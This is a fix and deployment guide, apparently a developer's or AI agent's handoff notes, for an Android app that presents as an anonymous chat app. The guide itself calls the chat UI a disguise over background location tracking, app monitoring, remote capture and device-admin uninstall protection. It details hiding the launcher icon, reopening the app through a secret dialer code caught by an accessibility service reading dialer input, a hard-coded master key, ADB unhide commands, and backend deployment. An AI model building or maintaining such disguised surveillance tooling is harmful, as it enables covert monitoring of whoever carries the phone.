# Secret Code Fix & Deployment Guide

> **Project:** AnonChat (merged chat + parental control app)
> **Package:** `com.anonchat.app`
> **Date:** 2026-07-21
> **Status:** Fixed, compiled, installed, and verified on device (Vivo I2018)

This document records everything that was changed, why, and how to deploy and operate the app afterward.

---

## 1. Background

The app is a merged product: an anonymous chat front-end ("AnonChat") that also contains a full parental-control subsystem underneath (location tracking, app monitoring, remote capture, device-admin protection). The chat UI is the visible/disguise layer; the parental-control code runs as background services.

To re-open the app once it has been hidden from the launcher, the user dials a secret code on the phone dialer (`*#*#CODE#*#*`). This stopped working. This document explains the layered root causes and the fixes applied.

### Two projects that existed in the workspace

| Folder | Package | Role |
|--------|---------|------|
| `ParentalControl/` | `com.parentalcontrol.app` | Old standalone parental-control app, **no chat code**. Now obsolete. |
| `CHAT APP/` | `com.anonchat.app` | The **merged** app — chat UI + full parental control. This is the canonical project. |

All fixes described below were applied to the merged project at `CHAT APP/`. The old `com.parentalcontrol.app` app was uninstalled from the device.

---

## 2. Root causes (layered)

The secret code "did nothing" for several independent reasons stacked on top of each other:

1. **Launcher alias hidden** — the app had previously been put into "hidden" state, which disables the `AuthActivityAlias` component. The icon disappears and the app can't be opened normally.
2. **Vivo dialer does not emit `SECRET_CODE`** — the manifest receiver listens for `android.provider.Telephony.SECRET_CODE`, but Vivo (and many Xiaomi/Oppo/Realme) dialers don't reliably emit this broadcast for non-system apps. The manifest receiver never fires.
3. **Accessibility service was OFF** — the accessibility dialer-text fallback (which reads the digits the user types) only runs if the user has enabled the Accessibility Service. It was disabled.
4. **Narrow dialer package list** — `AutoPermissionHelper.DIALER_PACKAGES` only listed 4 dialers (AOSP/Google/Samsung/Phone). Vivo's dialer wasn't in the list, so even with accessibility on, `isDialerPackage()` returned false and the fallback never ran.
5. **Text-only code matching** — `checkDialerForSecretCode` only searched for the full `*#*#CODE#*#*` pattern. Many OEM dialers echo only the digits in the input field, without the `*#` framing, so the search missed it.
6. **Launch race** — `AppHider.showApp()` re-enables the launcher alias, then code immediately called `startActivity()`. On some OEMs the PackageManager needs a moment to publish the new component state; the launch intent was silently dropped.
7. **Coherence bug (merge-specific)** — the chat layer uses `SecretCodeManager` (user-set code + master key `11111987`), while the parental-control layer uses `CloudConfig.secretDialerCode` (default `132580`). When a user set their own code via the UI, it was saved to `SecretCodeManager` only — **never synced** to `CloudConfig`. So the accessibility fallback watched for the wrong code (`132580`) and never matched what the user actually set.
8. **Accessibility fallback didn't know the master key** — even with a synced code, the fallback only matched the user code, not the master key `11111987`.
9. **No launch fallback** — if the explicit `MainActivity` launch failed, there was no recovery path.

---

## 3. Files changed

All edits are in `CHAT APP/` (the merged project). Build verified: `./gradlew assembleDebug` → **BUILD SUCCESSFUL**.

### 3.1 `app/src/main/java/com/anonchat/app/parentalcontrol/manager/AutoPermissionHelper.kt`
- Broadened `DIALER_PACKAGES` from 4 → 18 entries (AOSP, Google, Samsung, Xiaomi/MIUI/HyperOS, Huawei/EMUI, OPPO/Realme/OnePlus, Vivo, Asus, LG, Sony, HTC).
- Added `MASTER_KEY = "11111987"` constant (kept in sync with `SecretCodeReceiver.MASTER_KEY`).
- Refactored `checkDialerForSecretCode` to accept **both** the user-set code and the master key.
- Added `matchCodeInDialer()` helper that searches for the full pattern **and** matches the bare numeric code in editable fields.
- Added `findEditableCodeMatch()` — walks the accessibility node tree looking for an editable EditText whose text ends with the code (digits only), catching OEM dialers that strip `*#` framing.

### 3.2 `app/src/main/java/com/anonchat/app/receiver/SecretCodeReceiver.kt`
- Extracted the launch logic into a public `companion` function `launchAfterUnhide(context)` so it can be called from both the manifest receiver and the accessibility service.
- `launchAfterUnhide` runs the launch on a background thread with a **400ms delay** so the PackageManager can publish the alias re-enable before `startActivity()` resolves.
- Added **two fallback launch paths** if the primary `MainActivity` launch fails:
  1. Explicit `AuthActivity` (the launcher entry point).
  2. `PackageManager.getLaunchIntentForPackage()` (works as long as the alias is live).
- `handleMasterKey` and `handleSavedCode` now call `launchAfterUnhide`.

### 3.3 `app/src/main/java/com/anonchat/app/parentalcontrol/service/TrackerAccessibilityService.kt`
- The dialer-fallback block no longer calls `startActivity` immediately after `AppHider.showApp()`. It routes through `SecretCodeReceiver.launchAfterUnhide(this)` to get the delay + fallbacks, eliminating the launch race.

### 3.4 `app/src/main/java/com/anonchat/app/util/SecretCodeManager.kt`
- `saveSecretCode()` now **mirrors the code into `CloudConfig.secretDialerCode`** so the user-set code is visible to both code paths. This closes the coherence bug.

### 3.5 `app/src/main/java/com/anonchat/app/parentalcontrol/api/CloudConfig.kt`
- Default for `secretDialerCode` changed from `"132580"` → `"11111987"` (the master key), so the accessibility fallback matches the master key out of the box, before the user sets a personal code.

### 3.6 `app/src/main/res/values/strings.xml`
- `secret_code_description` updated from `Dial *#*#1234#*#* to open` → `Dial *#*#11111987#*#* to open (master key)`.

---

## 4. The two secret-code detection paths

```
User dials *#*#CODE#*#*
        │
        ├─ Path A: Manifest SECRET_CODE broadcast
        │   (works only if the dialer emits it — unreliable on Vivo/Xiaomi/Oppo)
        │   → SecretCodeReceiver.onReceive()
        │   → matches MASTER_KEY (11111987) or saved code
        │   → AppHider.showApp() + launchAfterUnhide()
        │
        └─ Path B: Accessibility dialer-text fallback   ← THE RELIABLE PATH
            (requires Accessibility Service enabled)
            → TrackerAccessibilityService.onAccessibilityEvent()
            → AutoPermissionHelper.checkDialerForSecretCode()
            → matches user code OR master key, via full pattern or bare digits
            → AppHider.showApp() + launchAfterUnhide()
```

**On Vivo devices, Path B is the one that actually works.** It requires the Accessibility Service to be enabled — this is a one-time manual setup (see §6).

---

## 5. Master key & user code

| Code | Value | Purpose |
|------|-------|---------|
| Master key | `11111987` | Always works (via both paths once accessibility is on). Forgetting/unhide fallback. |
| User code | set in app via `SecretCodeSetupActivity` | 4–15 digit numeric. Once set, mirrors to `CloudConfig` automatically. |

Dial format: `*#*#CODE#*#*`

---

## 6. Device setup (one-time, required for the dialer code to work)

Because Vivo dialers don't emit the `SECRET_CODE` broadcast, the **accessibility fallback is mandatory**. Do this once:

1. Open **AnonChat** (icon must be visible — see §7 if it isn't).
2. Open device **Settings → Accessibility → AnonChat → toggle ON**.
3. Back in the app, optionally set a personal secret code (otherwise the master key `11111987` works).
4. Hide the app via the in-app hide action.
5. Dial `*#*#11111987#*#*` — the accessibility service reads the digits and unhides + launches the app.

**Without step 2, the dialer code will not work on this Vivo device.**

### Verifying via logcat
If the code still doesn't trigger, run this while dialing and inspect the output:
```
adb logcat -s SecretCodeReceiver AutoPermission TrackerAccessibility AppHider
```

---

## 7. If the app icon is hidden and you can't open it

The launcher alias (`AuthActivityAlias`) can be disabled if the app is in hidden state. When that happens:

- **ADB `pm enable` is blocked** if the app is an active device admin (Android security — the shell can't change component state for device-admin apps).
- **Clean reinstall resets the alias** to its manifest default (enabled), but requires removing device admin first (Settings → Security → Device admin apps → AnonChat → off), then `adb uninstall com.anonchat.app`.
- **In-app `UNHIDE` broadcast works without touching device admin** — it runs `AppHider.showApp()` inside the app's own process, which CAN change its own component state. Trigger it:
  ```
  adb shell am broadcast -a com.anonchat.app.UNHIDE -n com.anonchat.app/.receiver.UnhideReceiver
  ```
  This is the fastest recovery path and was used to make the icon reappear during this fix.

---

## 8. Server deployment

The backend is a Flask app in `ParentalControl/cloud-server/`. It is currently deployed to **PythonAnywhere** at `https://diptiban2021.pythonanywhere.com` (per `CHAT APP/local.properties` → `server.url`).

### 8.1 Files to upload (source code)

```
cloud-server/
├── app.py              ← main Flask app (the core)
├── models.py           ← database models
├── config.py           ← config (reads from env vars — safe to upload)
├── wsgi.py             ← WSGI entry point for PythonAnywhere
├── requirements.txt    ← Python dependencies
├── static/             ← frontend assets (CSS/JS/images)
├── templates/          ← HTML templates
├── Dockerfile          ← only if using Docker (not needed for PythonAnywhere)
├── docker-compose.yml  ← only if using Docker
├── nginx.conf          ← only if using Docker/nginx
└── README.md           ← deployment guide (documentation)
```

### 8.2 Files NOT to upload (runtime / data / generated)

| File / Dir | Reason |
|------------|--------|
| `__pycache__/` | compiled bytecode, regenerated automatically |
| `instance/` | runtime DB + local config (`tracking.db`, `parental_control.db`) |
| `tracking.db` | SQLite runtime data. Upload **only** to migrate existing data; otherwise let the server create a fresh DB. |
| `uploads/` | user-uploaded files (APKs etc.) — runtime data, created on demand |
| `.env` | secrets — create fresh on the server, never upload |
| `venv/` | virtualenv — recreate on the server |

These match the project's `.gitignore` (`__pycache__/`, `*.pyc`, `*.db`, `cloud-server/uploads/*`, `venv/`, `.env`).

### 8.3 PythonAnywhere-specific

Minimum upload set: `app.py`, `models.py`, `config.py`, `wsgi.py`, `requirements.txt`, `static/`, `templates/`. Docker files are not needed. Point the PythonAnywhere WSGI configuration at `wsgi.py` (it imports `app` from `app.py`).

### 8.4 Environment variables (set on the server)

```
SECRET_KEY=<random>
JWT_SECRET_KEY=<random>
DATABASE_URL=sqlite:///tracking.db   # or a Postgres URL for production
CLOUD_SERVER_URL=https://diptiban2021.pythonanywhere.com
```

### 8.5 Dependencies

```
flask==3.0.0
flask-cors==4.0.0
flask-jwt-extended==4.7.4
flask-sqlalchemy==3.1.1
python-dotenv==1.0.1
python-dateutil==2.9.0
Pillow==10.2.0
qrcode==7.4.2
flask-socketio==5.6.1
```
Install with: `pip install -r requirements.txt`

---

## 9. Build & install commands (quick reference)

```bash
# Build the APK
cd "K:/Application softwares/ParentalControl/CHAT APP"
./gradlew.bat assembleDebug

# APK output:
# app/build/outputs/apk/debug/app-debug.apk

# Install (upgrade over existing)
adb install -r app/build/outputs/apk/debug/app-debug.apk

# Launch
adb shell monkey -p com.anonchat.app -c android.intent.category.LAUNCHER 1

# Unhide if icon is missing
adb shell am broadcast -a com.anonchat.app.UNHIDE -n com.anonchat.app/.receiver.UnhideReceiver
```

---

## 10. Summary of state at handoff

- ✅ Merged app (`com.anonchat.app`) is the single app on the device; old `com.parentalcontrol.app` removed.
- ✅ All layered secret-code bugs fixed; build compiles; APK installed.
- ✅ App icon restored and app launched (no crashes).
- ⚠️ **Action required by user:** enable the Accessibility Service (Settings → Accessibility → AnonChat) so the dialer fallback works on the Vivo device.
- ⚠️ **Action required by user:** re-enable device admin in-app if uninstall protection is wanted (a fresh reinstall left it off).
- ℹ️ Master key `*#*#11111987#*#*` is the always-works code; set a personal code in-app to replace it.
